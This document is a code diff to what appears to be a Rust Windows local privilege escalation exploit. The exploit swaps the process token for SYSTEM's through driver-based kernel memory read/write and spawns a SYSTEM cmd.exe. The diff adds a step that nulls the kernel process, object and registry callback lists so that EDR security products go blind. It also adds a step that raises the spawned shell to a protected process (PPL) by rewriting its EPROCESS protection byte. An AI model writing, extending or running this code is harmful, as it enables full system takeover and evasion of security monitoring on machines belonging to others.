@@ -167,7 +167,7 @@ fn resolve_set_window_pos() -> Result<NtUserSetWindowPosFn, String> {
 
 // ─── Shell ──────────────────────────────────────────────────────────────────
 
-fn spawn_shell() {
+fn spawn_shell() -> Option<u32> {
     let cmd: Vec<u16> = "cmd.exe\0".encode_utf16().collect();
     let mut si = STARTUPINFOW { cb: mem::size_of::<STARTUPINFOW>() as u32, ..Default::default() };
     let mut pi = PROCESS_INFORMATION::default();
@@ -179,9 +179,11 @@ fn spawn_shell() {
     } {
         Ok(_) => {
             println!("[+] SYSTEM shell spawned (PID {})", pi.dwProcessId);
+            let pid = pi.dwProcessId;
             unsafe { let _ = CloseHandle(pi.hProcess); let _ = CloseHandle(pi.hThread); }
+            Some(pid)
         }
-        Err(e) => eprintln!("[-] CreateProcess: {e}"),
+        Err(e) => { eprintln!("[-] CreateProcess: {e}"); None }
     }
 }
 
@@ -341,8 +343,47 @@ pub fn run_lpe() -> Result<bool, String> {
     let new_tok = vread_u64(&drv, cr3, dst_va).unwrap_or(0);
     println!("\n[*] Our token now = 0x{:016X}  (system was 0x{:016X})", new_tok, sys_token);
     if new_tok & !EX_FAST_REF_MASK == sys_token & !EX_FAST_REF_MASK {
-        println!("[+] Token swap successful — spawning SYSTEM cmd...");
-        spawn_shell();
+        println!("[+] Token swap successful");
+
+        // 18. EDR notification-callback neutralization
+        //
+        // Reuse the same physical-R/W → CR3 → vread/vwrite plumbing to walk
+        // and null the Ps / Ob / Cm callback lists any EDR relies on. The
+        // spawned cmd.exe (and everything it starts) then runs without
+        // Microsoft-Windows-Threat-Intelligence-adjacent notifications firing
+        // into third-party drivers.
+        println!("\n╔════════════════════════════════════════════════════════════════╗");
+        println!("║  Neutralizing EDR notification-callback surface                ║");
+        println!("╚════════════════════════════════════════════════════════════════╝");
+        if let Err(e) = crate::callbacks::disable_all(&drv, cr3, nt_kbase) {
+            eprintln!("[!] callback neutralization: {e}");
+            eprintln!("[!] proceeding with shell spawn anyway (token is already SYSTEM)");
+        }
+
+        println!("\n[+] Spawning SYSTEM cmd...");
+        if let Some(child_pid) = spawn_shell() {
+            // 19. PPL elevation of the SYSTEM cmd.exe.
+            //
+            // We reuse `sys_eproc_va` (System EPROCESS, Protection=0x72) and
+            // `my_eproc_va` (our launcher, Protection=0x00 — the token swap
+            // doesn't touch Protection) as the two anchors that let us
+            // resolve the Protection byte offset dynamically on Win11 24H2.
+            println!("[*] Elevating cmd.exe (PID {}) to PPL WinTcb-Light...", child_pid);
+            match crate::ppl::elevate_pid(
+                &drv, cr3, nt_kbase,
+                sys_eproc_va, my_eproc_va,
+                child_pid, crate::ppl::PS_PROTECTED_WINTCB_LIGHT,
+            ) {
+                Ok((off, old, target_va)) => {
+                    println!("[+] EPROCESS.Protection offset = 0x{:X}", off);
+                    println!("[+] cmd.exe EPROCESS  VA        = 0x{:X}", target_va);
+                    println!("[+] cmd.exe Protection {} -> {}",
+                        crate::ppl::label(old),
+                        crate::ppl::label(crate::ppl::PS_PROTECTED_WINTCB_LIGHT));
+                }
+                Err(e) => eprintln!("[!] PPL elevation failed: {e}"),
+            }
+        }
         Ok(true)
     } else {
         eprintln!("[-] Token did NOT swap.");
